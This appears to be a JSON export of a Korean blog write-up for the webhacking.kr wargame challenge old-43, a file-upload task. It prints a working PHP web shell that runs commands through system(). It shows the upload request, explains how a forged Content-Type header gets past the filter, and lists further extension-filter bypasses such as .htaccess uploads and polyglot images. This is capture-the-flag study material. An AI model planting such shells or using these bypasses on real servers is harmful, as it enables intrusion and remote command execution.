@@ -1,0 +1,531 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "a580c3f4-0bf5-5bb4-827a-08fdb17da82f",
+  "kind": "posts",
+  "title": "[webhacking.kr]  old-43 문제",
+  "slug": "tistory-68",
+  "description": "1. 문제 정보문제 번호 : old -43문제 점수 : 25점2. 문제 분석문제에 들어가면 you must webshell and cat /flag 글과 파일 업로드 하는 것이 나온다.웹쉘에서 cat /flag를 하면 flag가 나온다고 적혀있다. http는 아래처럼 생겼고 enctype=\"multipart/form-data\"는 HTML 폼(Form) 태그에서 서버로 데이터를 보낼 때, 데이터들을 어떻게 포장해서 보낼지 결정하는 인코딩 방식을 지정하는 속성이다. 파일을 보낼 때의 필수 조건 HTML의 form 태그는 기본적으로 application/x-www-form-urlencoded라는 방식을 사용한다. 이 방식은 모든 데이터를 텍스트(문자열)로 변환해서 전송한다. 하지만 이미지, 실행 파일, ..",
+  "category": "Wargame / webhacking.kr",
+  "date": "2026-01-30",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-01-30T04:09:50+09:00",
+  "updatedAt": "2026-01-30T04:10:02+09:00",
+  "sourceDigest": "30d8e2c98197c09062d074a3ed4642de2e13a77737552b66c34b48c01f93fdc5",
+  "assets": [
+    {
+      "id": "65caafb8-f146-5c36-aad3-5bf09b8671b9",
+      "name": "tistory-68-65caafb8-f146-5c36-aad3-5bf09b8671b9.png",
+      "type": "image/png",
+      "path": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/65caafb8-f146-5c36-aad3-5bf09b8671b9.png",
+      "sha": "a4231453d3cd44beea999c92bade2a6091ee7cb5"
+    },
+    {
+      "id": "064a1ae6-4433-5df7-a478-1033c5ad99a6",
+      "name": "tistory-68-064a1ae6-4433-5df7-a478-1033c5ad99a6.png",
+      "type": "image/png",
+      "path": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/064a1ae6-4433-5df7-a478-1033c5ad99a6.png",
+      "sha": "7300a803db347a335dc06169af5645e10c59423f"
+    },
+    {
+      "id": "54cad2db-a1c9-5290-a9fe-fce268178a0c",
+      "name": "tistory-68-54cad2db-a1c9-5290-a9fe-fce268178a0c.png",
+      "type": "image/png",
+      "path": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/54cad2db-a1c9-5290-a9fe-fce268178a0c.png",
+      "sha": "60586a09a75353286cae1a8342e1aff09390451c"
+    },
+    {
+      "id": "c1668efe-12ab-59f2-bc1e-97646a6f592d",
+      "name": "tistory-68-c1668efe-12ab-59f2-bc1e-97646a6f592d.png",
+      "type": "image/png",
+      "path": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/c1668efe-12ab-59f2-bc1e-97646a6f592d.png",
+      "sha": "0729ffdcdbaba3e03d374195788a11a74c134297"
+    },
+    {
+      "id": "17d1b5eb-5772-5abe-a46d-615087b2d993",
+      "name": "tistory-68-17d1b5eb-5772-5abe-a46d-615087b2d993.png",
+      "type": "image/png",
+      "path": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/17d1b5eb-5772-5abe-a46d-615087b2d993.png",
+      "sha": "b50856635e876bde58d6cea33b6cdaf95a18b72a"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "65caafb8-f146-5c36-aad3-5bf09b8671b9",
+          "src": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/65caafb8-f146-5c36-aad3-5bf09b8671b9.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 문제 정보"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 번호 : old -43"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 점수 : 25점"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제 분석"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문제에 들어가면 you must webshell and cat /flag 글과 파일 업로드 하는 것이 나온다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "웹쉘에서 cat /flag를 하면 flag가 나온다고 적혀있다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "064a1ae6-4433-5df7-a478-1033c5ad99a6",
+          "src": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/064a1ae6-4433-5df7-a478-1033c5ad99a6.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "http는 아래처럼 생겼고 enctype=\"multipart/form-data\"는 HTML 폼(Form) 태그에서 서버로 데이터를 보낼 때, 데이터들을 어떻게 포장해서 보낼지 결정하는 인코딩 방식을 지정하는 속성이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일을 보낼 때의 필수 조건 HTML의 form 태그는 기본적으로 application/x-www-form-urlencoded라는 방식을 사용한다. 이 방식은 모든 데이터를 텍스트(문자열)로 변환해서 전송한다. 하지만 이미지, 실행 파일, 압축 파일 같은 바이너리 데이터는 텍스트로 변환하면 내용이 깨지거나 손상되므로파일을 전송할 때는 반드시 데이터를 쪼개서 원본 그대로 전송하는 multipart/form-data를 써야만 한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<html>\n<head>\n<title>Challenge 43</title>\n</head>\n<body>\n<hr>\nYou must upload webshell and cat <b>/flag</b>\n<hr>\n<form method=post enctype=\"multipart/form-data\" action=index.php>\n<input name=file type=file><input type=submit>\n</form>\n</body>\n</html>"
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 풀이"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "php 웹쉘 코드는 이렇게 짤 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "<?php\n\necho 'Enter a Command:<br>';\necho '<form action=\"\">';\necho '<input type=text name=\"cmd\">';\necho '<input type=\"submit\">';\necho '</form>';\t\t\t\t\t\n\nif(isset($_GET['cmd'])){\n\tsystem($_GET['cmd']);\n}\n\n?>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "웹 쉘을 그냥 파일로 올리면 wrong type가 뜬다"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "54cad2db-a1c9-5290-a9fe-fce268178a0c",
+          "src": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/54cad2db-a1c9-5290-a9fe-fce268178a0c.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일을 업로드 하는 http 요청을 봐보자"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "cpp"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "POST /index.php HTTP/1.1\nHost: webhacking.kr:10004\nContent-Length: 408\nCache-Control: max-age=0\nAccept-Language: ko-KR,ko;q=0.9\nOrigin: http://webhacking.kr:10004\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFTXlJXr5E1MBb0zE\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://webhacking.kr:10004/\nAccept-Encoding: gzip, deflate, br\nCookie: PHPSESSID=h5jhp4l7gatm2eda96tjphvan7\nConnection: keep-alive\n\n------WebKitFormBoundaryFTXlJXr5E1MBb0zE\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: application/octet-stream\n\n<?php\n\necho 'Enter a Command:<br>';\necho '<form action=\"\">';\necho '<input type=text name=\"cmd\">';\necho '<input type=\"submit\">';\necho '</form>';\t\t\t\t\t\n\nif(isset($_GET['cmd'])){\n\tsystem($_GET['cmd']);\n}\n\n?>\n------WebKitFormBoundaryFTXlJXr5E1MBb0zE--"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 코드에서 확장자를 유추할만한 것은 content-type이랑 filename의 확장자이다. filename의 확장자를 바꿔도 똑같이 wrong type이므로 content-type를 text로 바꿔보면 웹 쉘이 올라간다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "application/octet-stream은 형식이 명확하게 지정되지 않은 임의의 이진 데이터를 의미한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "c1668efe-12ab-59f2-bc1e-97646a6f592d",
+          "src": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/c1668efe-12ab-59f2-bc1e-97646a6f592d.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "들어가서 cat /flag를 입력하면 flag가 나온다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "17d1b5eb-5772-5abe-a46d-615087b2d993",
+          "src": "/assets/uploads/a580c3f4-0bf5-5bb4-827a-08fdb17da82f/17d1b5eb-5772-5abe-a46d-615087b2d993.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 보안 관점에서 보완할 점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "현재 문제는 Content-Type 헤더 값을 기준으로 필터링을 수행했지만, 실제 환경에서는 확장자 검사도 병행하는 경우가 많다. 만약 서버가 .php 확장자를 직접 차단하고 있다면 어떻게 우회할 수 있을까?"
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 대소문자 혼용"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버가 확장자의 대소문자를 구분하지 않거나 필터링 전 소문자 변환 처리를 누락한 점을 이용한다. .php 대신 .PhP, .PHP 등의 형태로 업로드하여 검증을 통과하고 서버에서는 PHP로 실행되게 한다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 블랙리스트 미비점 공략"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "서버가 금지하는 특정 확장자 목록에 누락된 실행 파일 확장자를 사용한다. .php가 차단되어도 .php3, .php4, .phtml, .pht 등 동일하게 스크립트로 작동할 수 있는 다른 확장자를 선택하여 전송한다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 구조적 검증 로직 악용"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "파일명 파싱 로직의 허점을 노린다. 두 개의 확장자를 사용하는 이중 확장자 방식, 문자열의 끝을 강제로 인식시키는 널 바이트(%00) 삽입, 또는 시스템 예약어인 공백이나 마침표를 끝에 추가하여 필터링을 무력화한다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 서버 설정 파일 조작"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "업로드 권한이 있는 디렉토리에 서버 동작을 제어하는 설정 파일을 직접 올린다. Apache의 .htaccess나 IIS의 web.config를 업로드하여 특정 일반 텍스트 확장자(.txt, .jpg)를 PHP 엔진이 처리하도록 강제로 재설정한다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. 파일 시그니처 위장 (Polyglot)"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "확장자뿐만 아니라 파일의 내부 데이터까지 검사하는 경우에 사용한다. 이미지 파일의 헤더 정보(Magic Number)를 유지하면서 그 뒤에 웹쉘 코드를 삽입하여, 서버가 실제 이미지 파일로 오인하게 만든 뒤 실행시킨다."
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "5. 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "서버 측에서 파일의 확장자가 아닌 HTTP 요청 헤더의 Content-Type을 검사하여 업로드를 제한했다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "웹쉘 코드를 작성한 후, 요청 패킷에서 Content-Type을 application/octet-stream에서 image/jpeg나 text/plain 등으로 변환하여 필터링을 우회했다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "업로드된 PHP 파일을 실행하여 시스템 명령어 cat /flag를 전달하고 플래그 값을 획득했다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/68",
+    "originalId": "68",
+    "publishedAt": "2026-01-30T04:09:50+09:00",
+    "updatedAt": "2026-01-30T04:10:02+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
